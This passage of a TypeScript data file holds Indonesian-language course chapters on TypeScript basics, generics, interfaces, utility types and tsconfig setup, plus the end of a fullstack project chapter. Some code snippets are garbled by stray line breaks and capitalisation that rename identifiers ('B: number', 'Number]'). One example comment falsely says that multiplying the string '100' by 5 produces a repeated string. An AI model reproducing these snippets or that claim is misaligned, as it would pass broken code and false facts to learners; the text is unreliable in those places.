Setup Drizzle + PostgreSQL\\n   - Define schema (users, tasks,\n\nAttachments)\\n   - Create Hono routes\\n   - Add auth middleware (JWT)\\n   - Add cache layer (Redis)\\n   - Test API\\n\\n2.\n\n**Frontend Setup**\\n   - Init Vite + React + TypeScript\\n   - Setup Tailwind + shadcn/ui\\n   - Create pages and components\\n   - Connect to API\\n   - Add real-time (Supabase atau polling)\\n   - Handle file uploads\\n\\n3. **Integration**\\n   - Environment variables\\n   - CORS config\\n   - Error handling\\n   - Loading states\\n\\n4. **Deployment**\\n   - Deploy backend ke Dokploy\\n   - Deploy frontend ke Vercel\\n   - Setup environment variables\\n   - Configure domain\\n   - Test end-to-end\\n\\n**Best Practices**\\n- Gunakan TypeScript types yang shared antara frontend dan backend\\n- Validasi input di frontend DAN backend\\n- Handle error gracefully\\n- Implement loading dan error states\\n- Gunakan React Query atau SWR untuk data fetching\\n- Add proper logging di backend\\n\\nSelamat! Kamu sudah menguasai fullstack JavaScript modern.\n\nDari frontend interaktif sampai backend scalable dan deployment production. Selanjutnya: build something amazing!",

    codeExample: { language: "typescript", code: "// Shared types (shared between frontend and backend)\n// types.ts\nexport interface Task {\n  id: number;\n  title: string;\n  description: string | null;\n  status: 'todo' | 'in_progress' | 'done';\n  priority: 'low' | 'medium' | 'high';\n  userId: number;\n  createdAt: string;\n  updatedAt: string;\n}\n\nexport interface CreateTaskInput {\n  title: string;\n  description?: string;\n  priority?: 'low' | 'medium' | 'high';\n}\n\nexport interface ApiResponse<T> {\n  success: boolean;\n  data: T;\n  error?: string;\n}\n\n// Frontend: API client\n// api.ts\nconst API_URL = import.meta.env.VITE_API_URL;\n\nasync function fetcher<T>(endpoint: string, options?: RequestInit): Promise<T> {\n  const res = await fetch(`${API_URL}${endpoint}`, {\n    headers: { 'Content-Type': 'application/json' },\n    ...options,\n  });\n  if (!res.ok) throw new Error(await res.text());\n  return res.json();\n}\n\nexport const api = {\n  tasks: {\n    list: () => fetcher<Task[]>('/api/tasks'),\n    create: (data: CreateTaskInput) => fetcher<Task>('/api/tasks', {\n      method: 'POST',\n      body: JSON.stringify(data),\n    }),\n    update: (id: number, data: Partial<Task>) => fetcher<Task>(`/api/tasks/${id}`, {\n      method: 'PATCH',\n      body: JSON.stringify(data),\n    }),\n    delete: (id: number) => fetcher<void>(`/api/tasks/${id}`, { method: 'DELETE' }),\n  },\n};\n\n// Backend: Route handler\n// routes/tasks.ts\nimport { Hono } from 'hono';\nimport { zValidator } from '@hono/zod-validator';\nimport { z } from 'zod';\n\nconst tasks = new Hono();\n\nconst createSchema = z.object({\n  title: z.string().min(1),\n  description: z.string().optional(),\n  priority: z.enum(['low', 'medium', 'high']).default('medium'),\n});\n\ntasks.get('/', async (c) => {\n  const userId = c.get('userId');\n  const cached = await redis.get(`tasks:${userId}`);\n  if (cached) return c.json(JSON.parse(cached));\n  \n  const data = await db.select().from(tasksTable).where(eq(tasksTable.userId, userId));\n  await redis.setex(`tasks:${userId}`, 60, JSON.stringify(data));\n  return c.json(data);\n});\n\ntasks.post('/', zValidator('json', createSchema), async (c) => {\n  const userId = c.get('userId');\n  const input = c.req.valid('json');\n  const [task] = await db.insert(tasksTable).values({ ...input, userId }).returning();\n  await redis.del(`tasks:${userId}`); // Invalidate cache\n  return c.json(task, 201);\n});\n\nexport default tasks;" },

    explainAlong: "Shared types memastikan konsistensi antara frontend dan backend. Cache invalidation setelah mutasi data. API abstraction di frontend untuk clean code.",

    aiPrompt: "Mulai proyek fullstack-mu! Pilih ide yang menarik dan implementasikan dengan stack yang sudah dipelajari.",

    reflection: "Dokumentasikan journey-mu. Blog tentang pengalaman building dan deploying aplikasi fullstack — ini akan menjadi portfolio yang kuat.",

  },

];



// ============================================================

// MODUL 18: TYPESCRIPT (6 chapters)

// ============================================================



const modul18: Chapter[] = [

  {

    id: "18.1",

    moduleId: 18,

    chapterNum: "18.1",

    title: "TypeScript: Kenapa JavaScript Butuh Tipe?",

    subtitle: "Dari JavaScript dinamis ke type safety yang menjaga kode dari bug",

    level: "Pemula-Menengah",

    objectives: [

      "Memahami masalah yang diselesaikan TypeScript",

      "Bisa bedakan JavaScript vs TypeScript",

      "Mengerti static vs dynamic typing",

    ],

    analogy: { diagram: "JavaScript (Dinamis):\n  let data = 'hello'\n  data = 42  // JavaScript: OK, runtime error nanti\n\nTypeScript (Statis):\n  let data: string = 'hello'\n  data = 42  // TypeScript: ERROR! saat compile", caption: "TypeScript menambahkan type checking sebelum kode dijalankan — menangkap bug sebelum sampai ke user" },

    explanation: "Kalau kamu sudah nyaman dengan JavaScript, mungkin kamu bertanya-tanya: kenapa sih butuh TypeScript? Bukannya JavaScript sudah cukup? Pertanyaan yang valid. Untuk proyek kecil dan script singkat, JavaScript memang cukup.\n\nTapi begitu aplikasimu bertumbuh — puluhan file, ratusan fungsi,\n\nBanyak developer — JavaScript mulai terasa seperti membangun rumah tanpa blueprint.\\n\\n**Masalah JavaScript: Dynamic Typing**\\nJavaScript adalah bahasa dinamis: variabel bisa berisi tipe apa pun kapan saja.\n\nIni fleksibel tapi berbahaya:\\n\\n```\\nfunction greet(name) {\\n  return 'Halo, ' + name.toUpperCase();\\n}\\n\\ngreet(null);        // TypeError: Cannot read property 'toUpperCase' of null\\ngreet(42);          // TypeError: name.toUpperCase is not a function\\ngreet({});          // TypeError: name.toUpperCase is not a function\\n```\\n\\nError di atas baru muncul saat aplikasi berjalan — di production.\n\nDan ini baru satu fungsi sederhana.\n\nBayangkan ratusan fungsi di codebase yang sama.\\n\\n**TypeScript: Static Type Checking**\\nTypeScript menambahkan sistem tipe ke JavaScript.\n\nKode TypeScript tidak berjalan di browser — ia di-compile ke JavaScript biasa.\n\nTapi sebelum compile, TypeScript memeriksa setiap tipe:\\n\\n```\\nfunction greet(name: string): string {\\n  return 'Halo,\n\n' + name.toUpperCase();\\n}\\n\\ngreet(null);     // Error: Argument of type 'null' is not assignable to 'string'\\ngreet(42);       // Error: Argument of type 'number' is not assignable to 'string'\\n```\\n\\nError ini muncul saat DEVELOPMENT — sebelum kode sampai ke user.\n\nIni seperti punya asisten yang memeriksa pekerjaanmu sebelum diserahkan.\\n\\n**TypeScript adalah Superset JavaScript**\\nArtinya: SEMUA kode JavaScript valid adalah kode TypeScript valid.\n\nKamu bisa migrasi secara bertahap — menambahkan tipe sedikit demi sedikit.\n\nTidak perlu rewrite dari nol.\\n\\n**Keuntungan TypeScript**\\n1. **Menangkap bug lebih awal**: 15-20% bug bisa dicegah dengan type checking\\n2. **Autocompletion yang akurat**: IDE tahu tipe setiap variabel → autocomplete super power\\n3. **Refactoring aman**: Rename variabel/fungsi di seluruh codebase tanpa takut merusak\\n4.\n\n**Dokumentasi hidup**: Tipe berfungsi sebagai dokumentasi yang selalu up-to-date\\n5. **Team collaboration**: Developer lain bisa pahami API dari tipe tanpa membaca docs",

    codeExample: { language: "typescript", code: "// JavaScript — bug tersembunyi\nfunction calculateTotal(price, quantity) {\n  return price * quantity;\n}\n\ncalculateTotal('100', 5);  // '100100100100100' (string repeat!)\ncalculateTotal(100, '5');  // NaN\n\n// TypeScript — bug tertangkap saat development\nfunction calculateTotal(price: number, quantity: number): number {\n  return price * quantity;\n}\n\ncalculateTotal('100', 5);  // Error: 'string' not assignable to 'number'\ncalculateTotal(100, 5);    // OK → 500" },

    explainAlong: "Baris 5-6: JavaScript tidak protes saat string dikirim ke fungsi matematika. Baris 14-15: TypeScript menangkap kesalahan tipe sebelum kode berjalan.",

    aiPrompt: "Jelaskan perbedaan static vs dynamic typing dengan analogi. Berikan 3 contoh bug nyata yang bisa dicegah TypeScript di proyek yang pernah kamu alami.",

    reflection: "Coba tulis satu fungsi JavaScript yang punya bug tersembunyi (misalnya parameter yang salah tipe). Lalu tulis ulang dengan TypeScript dan lihat error apa yang muncul.",

  },

  {

    id: "18.2",

    moduleId: 18,

    chapterNum: "18.2",

    title: "Tipe Dasar TypeScript: Primitive, Array, dan Object",

    subtitle: "Kuasai building blocks sistem tipe TypeScript",

    level: "Pemula-Menengah",

    objectives: [

      "Menguasai tipe primitive TypeScript",

      "Bisa mendefinisikan array dan object types",

      "Mengerti type inference dan type annotation",

    ],

    analogy: { diagram: "Tipe Primitive:\n├── string, number, boolean\n├── null, undefined\n└── symbol, bigint\n\nTipe Compound:\n├── Array<T> atau T[]\n├── Object { key: type }\n└── Tuple [string, number]", caption: "TypeScript menambahkan tipe dasar yang familiar dari bahasa pemrograman lain" },

    explanation: "TypeScript memiliki sistem tipe yang intuitif kalau kamu sudah familiar dengan konsep tipe dari bahasa lain.\n\nMari pelajari dasar-dasarnya.\\n\\n**Tipe Primitive**\\nTipe dasar yang paling sering dipakai:\\n\\n```typescript\\nlet nama: string = 'Budi';\\nlet umur: number = 25;\\nlet aktif: boolean = true;\\n```\\n\\nTipe lain:\\n```typescript\\nlet kosong: null = null;\\nlet belumAda: undefined = undefined;\\nlet unik: symbol = Symbol('id');\\nlet besar: bigint = 9007199254740991n;\\n```\\n\\n**Type Inference: TypeScript yang Pintar**\\nTypeScript bisa menebak tipe dari nilai yang kamu assign — tidak perlu selalu menulis tipe:\\n\\n```typescript\\nlet nama = 'Budi';      // TypeScript tahu ini string\\nlet umur = 25;          // TypeScript tahu ini number\\nnama = 42;              // Error: Type 'number' not assignable to 'string'\\n```\\n\\n**Array**\\nDua cara mendefinisikan array:\\n\\n```typescript\\nlet angka: number[] = [1, 2, 3];\\nlet nama: Array<string> = ['Budi',\n\n'Ani'];  // Generic syntax\\n```\\n\\n**Object Type**\\nDefinisikan shape object dengan interface atau type:\\n\\n```typescript\\ninterface User {\\n  id: number;\\n  nama: string;\\n  email: string;\\n  aktif?: boolean;  // Optional (bisa ada, bisa tidak)\\n}\\n\\nconst user: User = {\\n  id: 1,\\n  nama: 'Budi',\\n  email: 'budi@mail.com',\\n  // aktif tidak wajib diisi karena optional\\n};\\n```\\n\\n**Tuple: Array dengan Tipe Tetap**\\nTuple adalah array dengan urutan tipe yang fixed:\\n\\n```typescript\\nlet koordinat: [number, number] = [10, 20];\\nlet userEntry: [number, string, boolean] = [1, 'Budi', true];\\n```\\n\\n**Union Type: Lebih dari Satu Tipe**\\nUnion memungkinkan variabel punya beberapa tipe:\\n\\n```typescript\\nlet id: string | number = 'abc123';\\nid = 42;  // OK, karena id bisa string atau number\\n```\\n\\nUnion sangat berguna untuk input yang fleksibel tapi tetap terkontrol.",

    codeExample: { language: "typescript", code: "// Interface untuk API Response\ninterface User {\n  id: number;\n  nama: string;\n  email: string;\n  avatar?: string;       // Optional\n  role: 'admin' | 'user'; // Union + Literal type\n}\n\ninterface Post {\n  id: number;\n  title: string;\n  content: string;\n  author: User;          // Nested object type\n  tags: string[];        // Array of strings\n  publishedAt: Date;\n}\n\n// Type inference dari return value\nfunction getUser(): User {\n  return {\n    id: 1,\n    nama: 'Budi',\n    email: 'budi@mail.com',\n    role: 'admin',\n  };\n}\n\n// Tuple untuk API result\ntype ApiResult<T> = [T | null, string | null];\n\nfunction fetchUser(): ApiResult<User> {\n  try {\n    const user = getUser();\n    return [user, null];\n  } catch (err) {\n    return [null, err instanceof Error ? err.message : 'Unknown error'];\n  }\n}\n\nconst [data, error] = fetchUser();\nif (error) console.error(error);\nelse console.log(data?.nama);" },

    explainAlong: "Interface mendefinisikan shape object. Union dengan literal type ('admin' | 'user') membatasi nilai yang valid. Tuple pattern [data, error] umum di Go/Rust.",

    aiPrompt: "Buat interface untuk Product (e-commerce) dan CartItem. Gunakan union type untuk ProductCategory, optional fields untuk diskon, dan array untuk tags.",

    reflection: "Coba hapus semua type annotations dari kode TypeScript-mu. Berapa banyak yang TypeScript bisa tebak otomatis (inference) vs yang perlu kamu tulis eksplisit?",

  },

  {

    id: "18.3",

    moduleId: 18,

    chapterNum: "18.3",

    title: "Functions, Generics, dan Type Narrowing",

    subtitle: "Tingkatkan fungsi JavaScript dengan type safety dan reusable patterns",

    level: "Menengah",

    objectives: [

      "Bisa mengetik fungsi dengan parameter dan return type",

      "Mengerti dan menggunakan generics",

      "Menguasai type narrowing dan type guards",

    ],

    analogy: { diagram: "Functions:\n├── Parameter types\n├── Return type\n├── Optional & default params\n└── Overloads\n\nGenerics:\n└── function identity<T>(arg: T): T", caption: "Functions + Generics + Type Narrowing = kode yang fleksibel tapi tetap type-safe" },

    explanation: "Setelah menguasai tipe dasar, saatnya belajar mengetik fungsi dan pattern advanced yang membuat TypeScript sangat powerful.\\n\\n**Typing Functions**\\nTypeScript memungkinkan kamu menentukan tipe parameter dan return value:\\n\\n```typescript\\nfunction tambah(a: number,\n\nB: number): number {\\n  return a + b;\\n}\\n\\n// Optional parameter\\nfunction greet(nama: string, greeting?: string): string {\\n  return `${greeting ??\n\n'Halo'}, ${nama}!`;\\n}\\n\\n// Default parameter\\nfunction greet(nama: string, greeting: string = 'Halo'): string {\\n  return `${greeting}, ${nama}!`;\\n}\\n```\\n\\n**Function Type / Callback**\\nDefinisikan tipe fungsi sebagai variabel:\\n\\n```typescript\\ntype Calculator = (a: number, b: number) => number;\\n\\nconst tambah: Calculator = (a, b) => a + b;\\nconst kali: Calculator = (a,\n\nB) => a * b;\\n```\\n\\n**Generics: Fungsi yang Bekerja untuk Tipe Apa Pun**\\nGenerics memungkinkan fungsi/class/interface bekerja dengan berbagai tipe tanpa kehilangan type information:\\n\\n```typescript\\n// Tanpa generic — kehilangan tipe\\nfunction identity(arg: any): any {\\n  return arg;\\n}\\nconst result = identity(5);  // result bertipe 'any' 😞\\n\\n// Dengan generic — tipe terjaga\\nfunction identity<T>(arg: T): T {\\n  return arg;\\n}\\nconst result = identity(5);  // result bertipe 'number' ✓\\n```\\n\\nGenerics adalah salah satu fitur paling powerful TypeScript.\n\nTanpa generics, kamu harus pilih: fleksibel (any) atau type-safe (tipe spesifik).\n\nDengan generics, kamu dapat keduanya.\\n\\n**Type Narrowing: Mengpersempit Tipe**\\nType narrowing adalah teknik mempersempit union type ke tipe yang lebih spesifik:\\n\\n```typescript\\nfunction process(value: string | number) {\\n  if (typeof value === 'string') {\\n    // Di sini, value bertipe 'string'\\n    return value.toUpperCase();\\n  } else {\\n    // Di sini,\n\nValue bertipe 'number'\\n    return value.toFixed(2);\\n  }\\n}\\n```\\n\\n**Type Guards**\\nType guard adalah fungsi yang memeriksa tipe runtime dan memberi tahu TypeScript:\\n\\n```typescript\\nfunction isString(value: unknown): value is string {\\n  return typeof value === 'string';\\n}\\n\\nfunction process(value: unknown) {\\n  if (isString(value)) {\\n    // value adalah string di sini\\n    return value.toUpperCase();\\n  }\\n}\\n```",

    codeExample: { language: "typescript", code: "// Generic function untuk API fetch\nasync function fetchApi<T>(url: string): Promise<T> {\n  const res = await fetch(url);\n  if (!res.ok) throw new Error(`HTTP ${res.status}`);\n  return res.json() as Promise<T>;\n}\n\n// Penggunaan — tipe terjaga!\ninterface User { id: number; nama: string; }\ninterface Post { id: number; title: string; }\n\nconst user = await fetchApi<User>('/api/users/1');\n// user bertipe User — autocomplete id, nama tersedia\n\nconst posts = await fetchApi<Post[]>('/api/posts');\n// posts bertipe Post[] — autocomplete map, filter, dll\n\n// Generic + Constraints\nfunction merge<T extends object, U extends object>(a: T, b: U): T & U {\n  return { ...a, ...b };\n}\n\nconst userConfig = merge(\n  { nama: 'Budi' },\n  { theme: 'dark' }\n);\n// userConfig: { nama: string; theme: string }\n\n// Type guard untuk validasi\nfunction isUser(obj: unknown): obj is User {\n  return (\n    typeof obj === 'object' &&\n    obj !== null &&\n    'id' in obj &&\n    'nama' in obj\n  );\n}\n\nconst data = JSON.parse('{}');\nif (isUser(data)) {\n  console.log(data.nama);  // Type-safe!\n}" },

    explainAlong: "fetchApi<T> menjaga tipe dari response JSON. extends object sebagai constraint memastikan T adalah object. Type guard isUser memvalidasi runtime shape.",

    aiPrompt: "Buat generic function filterByProperty<T> yang menerima array of T, key, dan value — mengembalikan elemen yang property-nya cocok. Gunakan keyof T.",

    reflection: "Tanpa generics, bagaimana kamu menulis fetchApi? Bandingkan dengan versi generic — apa bedanya dari sisi developer experience?",

  },

  {

    id: "18.4",

    moduleId: 18,

    chapterNum: "18.4",

    title: "Interface vs Type Alias: Kapan Pakai Mana?",

    subtitle: "Pahami dua cara mendefinisikan tipe dan trade-off masing-masing",

    level: "Menengah",

    objectives: [

      "Memahami perbedaan interface dan type alias",

      "Bisa memilih yang tepat untuk use case",

      "Mengerti declaration merging dan intersection",

    ],

    analogy: { diagram: "Interface:\ninterface User { name: string; }\ninterface User { age: number; }  // Merge!\n// User sekarang punya name + age\n\nType:\ntype User = { name: string; }\ntype User = { age: number; }   // Error! Duplicate", caption: "Interface bisa merge (declaration merging), Type lebih fleksibel untuk union dan tuple" },

    explanation: "Di TypeScript ada dua cara mendefinisikan tipe custom: interface dan type alias.\n\nKeduanya sering dipakai interchangeably, tapi punya perbedaan penting yang mempengaruhi kapan harus pakai mana.\\n\\n**Interface**\\nInterface adalah cara mendefinisikan shape object.\n\nBisa di-extend, di-implement oleh class, dan punya fitur declaration merging.\\n\\n```typescript\\ninterface User {\\n  id: number;\\n  name: string;\\n}\\n\\n// Declaration merging — interface dengan nama sama digabungkan\\ninterface User {\\n  email: string;\\n}\\n\\n// User sekarang punya: id, name, email\\nconst u: User = { id: 1, name: 'Budi', email: 'a@b.com' };\\n```\\n\\nDeclaration merging berguna saat kamu perlu menambahkan properti ke interface yang sudah ada — misalnya menambahkan properti ke Window atau Express Request object.\\n\\n**Type Alias**\\nType alias lebih fleksibel — bisa mendefinisikan union, tuple, primitive alias, dan mapped types:\\n\\n```typescript\\ntype ID = string | number;\\ntype Point = [number,\n\nNumber];\\ntype Status = 'active' | 'inactive' | 'pending';\\n\\n// Union yang tidak bisa dibuat dengan interface\\ntype Response = { success: true; data: User } | { success: false; error: string };\\n```\\n\\n**Kapan Pakai Mana?**\\n\\n**Pakai Interface kalau:**\\n- Mendefinisikan shape object\\n- Perlu extends / implements\\n- Mungkin perlu declaration merging\\n- API public yang mungkin di-extend user\\n\\n**Pakai Type kalau:**\\n- Butuh union type\\n- Butuh tuple type\\n- Type sederhana (alias)\\n- Mapped types atau conditional types\\n- Tidak perlu declaration merging\\n\\n**Rule of Thumb dari TypeScript Team:**\\nMulai dengan interface.\n\nPindah ke type kalau butuh fitur yang hanya type punya (union).\n\nIni konsisten dengan codebase TypeScript itu sendiri.\\n\\n**Intersection Type**\\nGabungkan dua tipe dengan &: \\n\\n```typescript\\ntype WithTimestamp = { createdAt: Date; updatedAt: Date };\\ntype UserWithTimestamp = User & WithTimestamp;\\n```\\n\\nIntersection sering dipakai untuk menambahkan properti ke tipe yang sudah ada tanpa mengubah tipe asli.",

    codeExample: { language: "typescript", code: "// Pattern: Base interface + feature interfaces\ninterface Entity {\n  id: number;\n  createdAt: Date;\n}\n\ninterface Auditable {\n  createdBy: string;\n  updatedBy: string;\n  updatedAt: Date;\n}\n\ninterface SoftDeletable {\n  deletedAt: Date | null;\n  isDeleted: boolean;\n}\n\n// Compose dengan intersection\ntype Product = Entity & Auditable & SoftDeletable & {\n  name: string;\n  price: number;\n  stock: number;\n};\n\n// API Response pattern dengan type\ntype ApiSuccess<T> = {\n  success: true;\n  data: T;\n  meta?: { page: number; total: number };\n};\n\ntype ApiError = {\n  success: false;\n  error: string;\n  code: string;\n};\n\ntype ApiResponse<T> = ApiSuccess<T> | ApiError;\n\n// Type guard untuk response\nfunction isSuccess<T>(res: ApiResponse<T>): res is ApiSuccess<T> {\n  return res.success === true;\n}\n\nconst res: ApiResponse<User> = await fetchApi('/user/1');\nif (isSuccess(res)) {\n  console.log(res.data.name);  // Tipe-safe!\n} else {\n  console.error(res.error);    // Tipe-safe!\n}" },

    explainAlong: "Entity & Auditable & SoftDeletable = compose behavior via intersection. ApiResponse<T> menggunakan union untuk representasi response yang bisa sukses atau error.",

    aiPrompt: "Refactor interface User yang sudah kamu buat: pisahkan Entity (id, timestamps), Auditable (who changed), dan Profile (name, email). Compose dengan intersection.",

    reflection: "Di codebase TypeScript populer (React, Vite, etc), cari 5 contoh interface dan 5 contoh type alias. Apakah mereka mengikuti rule of thumb?",

  },

  {

    id: "18.5",

    moduleId: 18,

    chapterNum: "18.5",

    title: "Advanced Types: Utility, Mapped, dan Conditional",

    subtitle: "Manfaatkan built-in utility types dan type-level programming",

    level: "Menengah-Lanjut",

    objectives: [

      "Menguasai utility types bawaan TypeScript",

      "Bisa menggunakan mapped types",

      "Mengerti conditional types dasar",

    ],

    analogy: { diagram: "Utility Types:\n├── Partial<T>     → semua optional\n├── Required<T>    → semua wajib\n├── Pick<T, K>     → pilih beberapa key\n├── Omit<T, K>     → hapus beberapa key\n├── Record<K, V>   → object dengan key dinamis\n└── ReturnType<T>  → tipe return fungsi", caption: "Utility types memungkinkan transformasi tipe tanpa mendefinisikan ulang" },

    explanation: "TypeScript punya banyak utility types bawaan yang memungkinkan kamu memanipulasi tipe secara declarative.\n\nIni seperti lodash untuk tipe — transformasi tipe tanpa boilerplate.\\n\\n**Utility Types yang Paling Sering Dipakai**\\n\\n**Partial<T>**: Buat semua properti menjadi optional.\n\nBerguna untuk update function:\\n\\n```typescript\\ninterface User { id: number; name: string; email: string; }\\ntype UpdateUser = Partial<User>;  // { id?: number; name?: string; email?: string }\\n\\nfunction updateUser(id: number, changes: Partial<User>) { ... }\\nupdateUser(1, { name: 'Baru' });  // OK, tidak perlu kirim semua field\\n```\\n\\n**Pick<T, K>**: Ambil subset properti:\\n\\n```typescript\\ntype UserPreview = Pick<User, 'id' | 'name'>;  // { id: number; name: string }\\n```\\n\\n**Omit<T, K>**: Hapus properti tertentu:\\n\\n```typescript\\ntype CreateUser = Omit<User, 'id'>;  // { name: string; email: string }\\n```\\n\\n**Record<K, V>**: Object dengan key dan value type tertentu:\\n\\n```typescript\\nconst rolePermissions: Record<string,\n\nString[]> = {\\n  admin: ['read', 'write', 'delete'],\\n  user: ['read'],\\n};\\n```\\n\\n**Mapped Types: Transformasi Tipe**\\nMapped types memungkinkan kamu membuat tipe baru dengan mengubah setiap properti tipe yang sudah ada:\\n\\n```typescript\\n// Buat semua properti menjadi readonly\\ntype Readonly<T> = {\\n  readonly [P in keyof T]: T[P];\\n};\\n\\n// Buat semua properti menjadi optional\\ntype Partial<T> = {\\n  [P in keyof T]?: T[P];\\n};\\n```\\n\\n**Conditional Types**\\nTipe yang bergantung pada kondisi:\\n\\n```typescript\\ntype IsString<T> = T extends string ? true : false;\\ntype A = IsString<'hello'>;  // true\\ntype B = IsString<42>;       // false\\n```\\n\\nConditional types memungkinkan type-level programming — logika di level tipe.\n\nIni advanced tapi sangat powerful untuk library authors.",

    codeExample: { language: "typescript", code: "// API layer pattern dengan utility types\ninterface User {\n  id: number;\n  name: string;\n  email: string;\n  password: string;\n  role: 'admin' | 'user';\n  createdAt: Date;\n}\n\n// DTO (Data Transfer Object) patterns\ntype CreateUserDto = Omit<User, 'id' | 'createdAt'>;\ntype UpdateUserDto = Partial<Omit<User, 'id' | 'createdAt'>>;\ntype UserResponse = Omit<User, 'password'>;\ntype UserPreview = Pick<User, 'id' | 'name' | 'email'>;\n\n// Generic CRUD service pattern\ninterface CrudService<T, CreateDto, UpdateDto> {\n  findAll(): Promise<T[]>;\n  findById(id: number): Promise<T | null>;\n  create(data: CreateDto): Promise<T>;\n  update(id: number, data: UpdateDto): Promise<T>;\n  delete(id: number): Promise<void>;\n}\n\n// Implementasi\nclass UserService implements CrudService<UserResponse, CreateUserDto, UpdateUserDto> {\n  async findAll(): Promise<UserResponse[]> { /* ... */ return []; }\n  async findById(id: number): Promise<UserResponse | null> { return null; }\n  async create(data: CreateUserDto): Promise<UserResponse> { throw new Error(); }\n  async update(id: number, data: UpdateUserDto): Promise<UserResponse> { throw new Error(); }\n  async delete(id: number): Promise<void> { /* ... */ }\n}\n\n// Record untuk lookup\ntype HttpStatus = 200 | 201 | 400 | 401 | 404 | 500;\nconst statusMessages: Record<HttpStatus, string> = {\n  200: 'OK',\n  201: 'Created',\n  400: 'Bad Request',\n  401: 'Unauthorized',\n  404: 'Not Found',\n  500: 'Internal Server Error',\n};" },

    explainAlong: "Omit<User, 'password'> menghapus field sensitif untuk response. Pick untuk DTO ringan. Partial<Omit<...>> untuk update yang hanya kirim field yang berubah.",

    aiPrompt: "Buat tipe DTO lengkap untuk entity Product: CreateDto, UpdateDto, ResponseDto (tanpa internal fields), dan PublicDto (hanya field yang boleh dilihat customer).",

    reflection: "Utility types mengurangi duplikasi tipe signifikan. Hitung berapa baris kode yang kamu hemat dengan menggunakan Pick/Omit/Partial dibanding mendefinisikan tipe manual.",

  },

  {

    id: "18.6",

    moduleId: 18,

    chapterNum: "18.6",

    title: "TypeScript di Proyek Nyata: Config, ESLint, dan Pattern",

    subtitle: "Setup TypeScript production-ready dan pattern yang digunakan di industri",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa konfigurasi tsconfig.json",

      "Mengerti strict mode dan compiler options",

      "Menguasai pattern TypeScript di proyek besar",

    ],

    analogy: { diagram: "tsconfig.json:\n├── strict: true (type safety maksimal)\n├── noImplicitAny (larang any implisit)\n├── strictNullChecks (null/undefined terpisah)\n└── paths (path alias untuk import)", caption: "tsconfig.json adalah blueprint TypeScript — konfigurasi yang tepat sangat penting" },

    explanation: "Setelah menguasai syntax TypeScript, saatnya belajar setup proyek production-ready.\n\nKonfigurasi yang benar akan membantumu menangkap lebih banyak bug dan meningkatkan developer experience.\\n\\n**tsconfig.json: Konfigurasi Utama**\\ntsconfig.json adalah file konfigurasi TypeScript.\n\nIni contoh konfigurasi untuk proyek modern:\\n\\n```json\\n{\\n  \\\"compilerOptions\\\": {\\n    \\\"target\\\": \\\"ES2022\\\",\\n    \\\"module\\\": \\\"ESNext\\\",\\n    \\\"moduleResolution\\\": \\\"bundler\\\",\\n    \\\"lib\\\": [\\\"ES2022\\\", \\\"DOM\\\",\n\n\\\"DOM.Iterable\\\"],\\n    \\\"jsx\\\": \\\"react-jsx\\\",\\n    \\\"strict\\\": true,\\n    \\\"noUnusedLocals\\\": true,\\n    \\\"noUnusedParameters\\\": true,\\n    \\\"noImplicitReturns\\\": true,\\n    \\\"noFallthroughCasesInSwitch\\\": true,\\n    \\\"esModuleInterop\\\": true,\\n    \\\"skipLibCheck\\\": true,\\n    \\\"forceConsistentCasingInFileNames\\\": true,\\n    \\\"resolveJsonModule\\\": true,\\n    \\\"declaration\\\": true,\\n    \\\"declarationMap\\\": true,\\n    \\\"sourceMap\\\": true,\\n    \\\"outDir\\\": \\\"./dist\\\",\\n    \\\"rootDir\\\": \\\"./src\\\",\\n    \\\"baseUrl\\\": \\\".\\\",\\n    \\\"paths\\\": {\\n      \\\"@/*\\\": [\\\"./src/*\\\"]\\n    }\\n  },\\n  \\\"include\\\": [\\\"src\\\"],\\n  \\\"exclude\\\": [\\\"node_modules\\\", \\\"dist\\\"]\\n}\\n```\\n\\n**Compiler Options Penting**\\n\\n**strict: true** — Mengaktifkan SEMUA strict type checking.\n\nIni SETTING PALING PENTING.\n\nDengan strict mode, TypeScript akan:\\n- noImplicitAny: Melarang any implisit\\n- strictNullChecks: Memisahkan null/undefined dari tipe lain\\n- strictFunctionTypes: Memeriksa tipe fungsi lebih ketat\\n- strictBindCallApply: Memeriksa bind/call/apply\\n\\nSelalu aktifkan strict: true di proyek baru.\n\nLebih sulit di awal tapi menyelamatkan dari ratusan bug.\\n\\n**Pattern: Barrel Export**\\nSederhanakan import dengan mengelompokkan export di file index.ts:\\n\\n```typescript\\n// src/types/index.ts\\nexport type { User, CreateUserDto, UpdateUserDto } from './user';\\nexport type { Post, CreatePostDto } from './post';\\n\\n// Penggunaan\\nimport { User,\n\nCreateUserDto } from '@/types';\\n```\\n\\n**Pattern: Branded Types**\\nBedakan tipe yang struktur datanya sama tapi maknanya berbeda:\\n\\n```typescript\\ntype UserId = string & { readonly brand: unique symbol };\\ntype PostId = string & { readonly brand: unique symbol };\\n\\nfunction getUser(id: UserId) { ... }\\nfunction getPost(id: PostId) { ... }\\n\\nconst userId = 'abc' as UserId;\\ngetUser(userId);     // OK\\ngetPost(userId);     // Error!\n\nUserId tidak assignable ke PostId\\n```\\n\\n**ESLint + TypeScript**\\nSetup ESLint dengan TypeScript untuk aturan tambahan:\\n\\n```bash\\nnpm install -D eslint @eslint/js typescript-eslint\\n```\\n\\nESLint menangkap pola yang TypeScript compiler tidak tangkap: unused variables, prefer const, dan banyak aturan code quality.",

    codeExample: { language: "json", code: "// tsconfig.json untuk proyek React + Vite\n{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"useDefineForClassFields\": true,\n    \"module\": \"ESNext\",\n    \"moduleResolution\": \"bundler\",\n    \"allowImportingTsExtensions\": true,\n    \"resolveJsonModule\": true,\n    \"isolatedModules\": true,\n    \"noEmit\": true,\n    \"jsx\": \"react-jsx\",\n    \"strict\": true,\n    \"noUnusedLocals\": true,\n    \"noUnusedParameters\": true,\n    \"noFallthroughCasesInSwitch\": true,\n    \"baseUrl\": \".\",\n    \"paths\": {\n      \"@/*\": [\"./src/*\"]\n    }\n  },\n  \"include\": [\"src\"]\n}\n\n// Pattern: Repository dengan typed errors\ntype Result<T, E = Error> =\n  | { ok: true; data: T }\n  | { ok: false; error: E };\n\nclass UserRepository {\n  async findById(id: number): Promise<Result<User>> {\n    try {\n      const user = await db.query('SELECT * FROM users WHERE id = ?', [id]);\n      if (!user) return { ok: false, error: new Error('User not found') };\n      return { ok: true, data: user };\n    } catch (err) {\n      return { ok: false, error: err instanceof Error ? err : new Error('Unknown') };\n    }\n  }\n}\n\n// Penggunaan — handle error secara eksplisit\nconst result = await userRepo.findById(1);\nif (!result.ok) {\n  console.error(result.error.message);\n  